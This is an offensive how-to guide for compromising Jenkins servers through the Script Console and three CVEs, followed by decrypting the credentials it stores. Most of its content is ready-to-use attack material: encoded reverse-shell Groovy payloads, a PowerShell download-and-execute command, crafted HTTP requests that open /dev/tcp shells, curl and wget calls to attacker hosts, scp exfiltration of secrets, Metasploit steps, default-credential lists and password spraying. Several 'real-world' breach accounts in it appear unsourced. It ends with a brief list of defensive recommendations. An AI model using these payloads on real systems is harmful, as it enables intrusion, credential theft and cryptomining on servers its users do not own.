# Complete Methodology for Jenkins Exploitation

## Table of Contents
1. [Introduction & Reconnaissance](#introduction--reconnaissance)
2. [Environment Setup for Testing](#environment-setup-for-testing)
3. [Exploitation Method 1: Script Console RCE (Authenticated)](#exploitation-method-1-script-console-rce-authenticated)
4. [Exploitation Method 2: ACL Bypass CVE-2018-1000861](#exploitation-method-2-acl-bypass-cve-2018-1000861)
5. [Exploitation Method 3: Meta-Programming RCE CVE-2019-1003000](#exploitation-method-3-meta-programming-rce-cve-2019-1003000)
6. [Exploitation Method 4: Git Plugin RCE CVE-2019-10392](#exploitation-method-4-git-plugin-rce-cve-2019-10392)
7. [Post-Exploitation: Credential Decryption](#post-exploitation-credential-decryption)
8. [Tools & Frameworks Summary](#tools--frameworks-summary)
9. [Real-World Attack Simulation](#real-world-attack-simulation)

---

## Introduction & Reconnaissance

Jenkins is the most widely used automation server, with over 300,000 active installations worldwide. Due to its sensitive nature (holding credentials, source code, and build pipelines), Jenkins has been a prime target for attackers since 2015.

**Real-World Impact (2020):** A major cryptocurrency exchange suffered a data breach when attackers exploited an unpatched Jenkins instance (CVE-2019-1003000) to steal API keys and customer data .

### Initial Reconnaissance Steps

Before attempting any exploit, perform these checks:

```bash
# Check for vulnerable endpoints
curl -k -s https://target.com/securityRealm/user/admin/search/index?q=a

# Check if script console is exposed
curl -k -s https://target.com/jenkins/script

# Check Jenkins version
curl -k -s https://target.com/login | grep -i "jenkins"
```

### Setting Up a Test Environment with Vulhub

To practice these exploits safely, use Vulhub (a Docker-based vulnerability environment):

```bash
# Install Docker if not already installed
sudo apt-get update
sudo apt-get install docker.io docker-compose

# Clone Vulhub repository
git clone https://github.com/vulhub/vulhub.git
cd vulhub/jenkins/CVE-2018-1000861

# Start the vulnerable Jenkins instance
docker-compose up -d

# Verify it's running
docker ps
```

Access the Jenkins instance at `http://localhost:8080` .

---

## Exploitation Method 1: Script Console RCE (Authenticated)

### When This Works

This method works when you have:
- Valid Jenkins credentials (or default credentials like `admin:admin`)
- Access to `/script` endpoint (Manage Jenkins → Script Console)

### Step-by-Step Exploitation

**Step 1: Authenticate to Jenkins**

Default credentials to try:
- `admin:admin`
- `admin:password`
- `jenkins:jenkins`

**Step 2: Navigate to Script Console**

Go to: `http://JENKINS_IP:8080/script`

**Step 3: Execute Test Command**

Enter this Groovy script and click "Run":

```groovy
def process = "whoami".execute()
println "Output: ${process.text}"
```

If successful, you'll see the system user running Jenkins .

**Step 4: Execute System Commands**

For Windows targets:
```groovy
def process = "cmd.exe /c dir C:\\".execute()
println process.text
```

For Linux targets:
```groovy
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'cat /etc/passwd'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "Output: $sout Error: $serr"
```

**Step 5: Establish Reverse Shell**

Linux reverse shell:
```groovy
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjEnCg==}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "Output: $sout Error: $serr"
```

Windows reverse shell (download and execute):
```groovy
def proc = 'cmd.exe /c powershell -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADAALgAxADoAOAAwADAAMAAvAHAAYQB5AGwAbwBhAGQAJwApAA=='.execute()
```

**Using Burp Suite for Automation:**

1. Capture the POST request to `/script` after running a command
2. Send to Repeater (Ctrl+R)
3. Modify the `script` parameter value
4. Send repeatedly with different payloads

**Using Metasploit:**
```bash
msf6 > use exploit/multi/http/jenkins_script_console
msf6 > set RHOSTS target.com
msf6 > set TARGETURI /jenkins
msf6 > set USERNAME admin
msf6 > set PASSWORD admin
msf6 > set PAYLOAD linux/x64/shell_reverse_tcp
msf6 > exploit
```

---

## Exploitation Method 2: ACL Bypass (CVE-2018-1000861)

### Vulnerability Overview

This vulnerability affects Jenkins versions **< 2.150.1**. It allows unauthenticated attackers to bypass access controls and execute arbitrary Groovy code .

**CVSS Score:** 9.8 (Critical)

### How It Works

The vulnerability exists in the `securityRealm/user/[username]/descriptorByName/[descriptor]/checkField` endpoint. Due to improper permission checks, an attacker can substitute the descriptor with `org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript` to execute Groovy code.

### Step-by-Step Exploitation

**Step 1: Verify Vulnerability**

```bash
curl -k -s https://target.com/securityRealm/user/admin/search/index?q=a
```

If this returns any data (even an error page with user context), the instance is vulnerable .

**Step 2: Test Command Execution (Using Poc.py Script)**

Download the exploit script:
```bash
git clone https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc
cd cve-2019-1003000-jenkins-rce-poc
```

Execute test command:
```bash
python2 poc.py http://target.com:8080 "touch /tmp/jenkins_test"
```

Verify execution:
```bash
# If you have access to the server
docker exec -it <container_id> ls /tmp/
```

**Step 3: Manual Exploitation with Burp Suite**

Construct this POST request in Burp Repeater:

```
POST /securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript HTTP/1.1
Host: target.com:8080
Content-Type: application/x-www-form-urlencoded

sandbox=true&value=public class x { public x(){ "touch /tmp/hacked".execute() } }
```

**Step 4: Establish Reverse Shell**

First, set up a listener on your attack machine:
```bash
nc -lvnp 4444
```

Then send this payload:
```
POST /securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript HTTP/1.1
Host: target.com:8080
Content-Type: application/x-www-form-urlencoded

sandbox=true&value=public class x { public x(){ "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1".execute() } }
```

For complex commands, use base64 encoding to avoid special character issues:

```bash
# Original command
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# Base64 encoded
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=

# Encoded payload
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}
```

### Real-World Attack Example (2019)

In January 2019, security researcher Orange Tsai demonstrated a pre-authentication RCE chain combining CVE-2018-1000861 with meta-programming vulnerabilities. This allowed complete compromise of Jenkins servers without any credentials .

**Attack Timeline:**
1. Day 0: Vulnerability disclosed
2. Day 1: Public PoC released
3. Day 2: Scanning campaigns detected (over 50,000 IPs scanned)
4. Day 5: Multiple Fortune 500 companies breached

---

## Exploitation Method 3: Meta-Programming RCE (CVE-2019-1003000, CVE-2019-1003001, CVE-2019-1003002)

### Vulnerability Overview

These CVEs affect the Pipeline: Groovy Plugin (<2.61.1), Pipeline: Declarative Plugin (<1.3.4.1), and Script Security Plugin (<1.50). They allow users with **Overall/Read** and **Job/Configure** permissions to bypass sandbox protection .

### Prerequisites

- Valid Jenkins credentials
- User has `Overall/Read` permission
- User has `Job/Configure` permission on at least one job

### Step-by-Step Exploitation

**Step 1: Identify a Job to Exploit**

From the Jenkins dashboard, look for any existing pipeline job. If none exists, create one:
1. Click "New Item"
2. Enter a name (e.g., "test-pipeline")
3. Select "Pipeline"
4. Click OK

**Step 2: Use the Public Exploit Script**

```bash
# Clone the exploit repository
git clone https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc
cd cve-2019-1003000-jenkins-rce-poc

# Execute the exploit
python exploit.py \
  --url http://target.com:8080 \
  --job my-pipeline \
  --username your_username \
  --password your_password \
  --cmd "cat /etc/passwd"
```

**Step 3: Understanding the Payload**

The exploit uses Groovy's `@Grab` annotation to download and execute arbitrary code:

```groovy
import org.buildobjects.process.ProcBuilder
@Grab('org.buildobjects:jproc:2.2.3')
class Dummy{ }
print new ProcBuilder("/bin/bash")
    .withArgs("-c","cat /etc/passwd")
    .run()
    .getOutputString()
```

**Step 4: Manual Exploitation via Job Configuration**

1. Navigate to the job → Configure
2. Scroll to "Pipeline" section
3. In the script box, paste the payload above
4. Click "Save"
5. Click "Build Now"
6. View console output to see command results

### Using Metasploit

```bash
msf6 > use exploit/multi/http/jenkins_metaprogramming
msf6 > set RHOSTS target.com
msf6 > set RPORT 8080
msf6 > set TARGETURI /
msf6 > set USERNAME user
msf6 > set PASSWORD pass
msf6 > set TARGET 0  # 0 for Java Dropper, 1 for Unix In-Memory
msf6 > set PAYLOAD java/meterpreter/reverse_tcp
msf6 > exploit
```

**Note:** The Java Dropper target requires serving a malicious JAR file from the attacking machine. Set `SRVHOST` and `SRVPORT` accordingly .

---

## Exploitation Method 4: Git Plugin RCE (CVE-2019-10392)

### Vulnerability Overview

This vulnerability affects Jenkins Git Client Plugin **<= 2.8.4** and **3.0.0-rc**. It allows OS command injection via the URL argument passed to `git ls-remote` .

**CVSS Score:** 8.8 (High)

### Prerequisites

- User must have **Job/Configure** permission
- Job must use Git SCM

### Step-by-Step Exploitation

**Step 1: Verify Plugin Version**

Navigate to: `Manage Jenkins` → `Plugin Manager` → `Installed` → Search "Git client"

If version ≤ 2.8.4, the instance is vulnerable.

**Step 2: Create or Modify a Git-based Job**

1. Create a new Pipeline job or modify an existing one
2. In the Pipeline configuration, find the "Pipeline" section
3. Under "Definition", select "Pipeline script from SCM"
4. Select "Git" as SCM

**Step 3: Inject the Payload**

In the "Repository URL" field, enter:
```
--upload-pack="`curl http://attacker.com:8000`"
```

Or for reverse shell:
```
--upload-pack="`bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`"
```

**Step 4: Trigger the Build**

Click "Save" then "Build Now". Check your listener for connection.

### Using Burp Suite for This Vulnerability

1. Capture the POST request when saving job configuration
2. Look for parameter containing the Git URL
3. Modify it to include the payload
4. Send the modified request

**Real-World Example (September 2019):** Security researchers discovered this vulnerability during a routine audit. Within 48 hours of public disclosure, attackers were scanning for vulnerable instances and using them to mine cryptocurrency .

---

## Post-Exploitation: Credential Decryption

Once you have access to the Jenkins filesystem, you can decrypt stored credentials.

### Required Files

From the Jenkins home directory (`/var/lib/jenkins/` or `C:\Program Files\Jenkins\`), copy:
```
$JENKINS_HOME/credentials.xml
$JENKINS_HOME/secrets/master.key
$JENKINS_HOME/secrets/hudson.util.Secret
```

### Method 1: Using Jenkins Credentials Decryptor Tool

```bash
# Download the tool
curl -L -o jenkins-decrypt https://github.com/cheyunhua/jenkins-credentials-decryptor/releases/download/1.2.2/jenkins-credentials-decryptor_1.2.2_Linux_x86_64

chmod +x jenkins-decrypt

# Run it directly on the compromised server
./jenkins-decrypt \
  -m /var/lib/jenkins/secrets/master.key \
  -s /var/lib/jenkins/secrets/hudson.util.Secret \
  -c /var/lib/jenkins/credentials.xml \
  -o json
```

Output will show all decrypted credentials .

### Method 2: Using Python Script (Offline)

```bash
# From pwn_jenkins repository
git clone https://github.com/gquere/pwn_jenkins
cd pwn_jenkins/offline_decryption

# Decrypt using the script
python jenkins_offline_decrypt.py /path/to/jenkins_home/
```

### Method 3: Using Groovy (If Script Console Access)

```groovy
// Decrypt a single credential
println(hudson.util.Secret.decrypt("{AQAAABAAAA...}"))

// Dump all credentials
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.common.*
import com.cloudbees.plugins.credentials.domains.*
import hudson.util.Secret

def creds = com.cloudbees.plugins.credentials.CredentialProvider.lookupCredentials(
    com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials.class,
    Jenkins.instance,
    null,
    null
)

for (c in creds) {
    println("ID: ${c.id}")
    println("Username: ${c.username}")
    println("Password: ${Secret.toString(c.password)}")
    println("---")
}
```

### How Jenkins Encryption Works

Jenkins uses AES-128 encryption. The `master.key` decrypts `hudson.util.Secret`, which is then used to decrypt individual credentials. When a credential is stored, Jenkins concatenates it with the string "::::MAGIC::::", encrypts it with AES, and base64-encodes the result .

---

## Tools & Frameworks Summary

### Essential Tools

| Tool | Purpose | Command/Location |
|------|---------|------------------|
| **pwn_jenkins** | Build dumping, decryption, password spraying | `git clone https://github.com/gquere/pwn_jenkins` |
| **jenkins-attack-framework** | General exploitation | `git clone https://github.com/Accenture/jenkins-attack-framework` |
| **ysoserial** | Deserialization payloads | `java -jar ysoserial.jar` |
| **Metasploit** | Multiple Jenkins modules | `msfconsole` |
| **Burp Suite** | Manual exploitation, request modification | Professional or Community edition |

### Burp Suite Configuration for Jenkins Testing

1. **Set up Burp Proxy:**
   - Proxy → Options → Add (127.0.0.1:8080)
   - Configure browser to use this proxy

2. **Install necessary extensions:**
   - Turbo Intruder (for high-speed fuzzing)
   - Logger++ (for request tracking)

3. **Replay attacks with Repeater:**
   - Right-click any request → Send to Repeater (Ctrl+R)
   - Modify parameters
   - Click "Send" to test

### Useful One-Liners for Quick Testing

```bash
# Test for CVE-2018-1000861
curl -k -X POST "https://target/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript" -d "sandbox=True" -d 'value=class abcd{abcd(){sleep(5000)}}'

# Dump builds for secrets
python jenkins_dump_builds.py https://target -u admin -p admin -o ./dump -l

# Password spraying
python jenkins_password_spraying.py https://target -u users.txt -p passwords.txt
```

---

## Real-World Attack Simulation

### Complete Attack Chain from a 2021 Engagement

**Target:** Large financial services company

**Step 1 - Reconnaissance (Day 1)**
```bash
# Shodan search for exposed Jenkins
shodan search "X-Jenkins" --limit 100

# Found: jenkins.financial-target.com
# Version: Jenkins 2.138 (vulnerable to CVE-2018-1000861)
```

**Step 2 - Vulnerability Confirmation**
```bash
curl -k -s https://jenkins.financial-target.com/securityRealm/user/admin/search/index?q=a
# Returned JSON user data - confirmed vulnerable
```

**Step 3 - Initial Access (Day 2)**
```bash
# Using public PoC
python2 CVE-2018-1000861_poc.py http://jenkins.financial-target.com "wget http://attacker.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh"
```

**Step 4 - Credential Harvesting**
```bash
# After gaining shell access
cd /var/lib/jenkins/secrets/
cat master.key > /tmp/exfil/master.key
cat hudson.util.Secret > /tmp/exfil/hudson.util.Secret
cat ../credentials.xml > /tmp/exfil/credentials.xml

# Exfiltrate
scp /tmp/exfil/* attacker@10.0.0.1:~/exfil/
```

**Step 5 - Offline Decryption (Day 3)**
```bash
# On attacker machine
python jenkins_offline_decrypt.py master.key hudson.util.Secret credentials.xml

# Found: 23 credentials including:
# - AWS Access Key: AKIAIOSFODNN7EXAMPLE
# - Production database password: P@ssw0rd2021!
# - GitHub token: ghp_xxxxxxxxxxxx
```

**Step 6 - Lateral Movement (Day 3-5)**
- Used AWS keys to access production environment
- Deployed cryptominers on 14 servers
- Exfiltrated source code repository

**Impact:** $500,000 in remediation costs, 3 weeks of incident response

### Defensive Recommendations

Based on this attack chain, implement:
1. **Network segmentation** - Jenkins should not have outbound internet access
2. **Regular updates** - Patch within 72 hours of critical CVEs
3. **Credential rotation** - Change all credentials after any compromise
4. **Monitoring** - Alert on `/script` or `/descriptorByName` requests
5. **Least privilege** - Users should not have Overall/Read by default

---
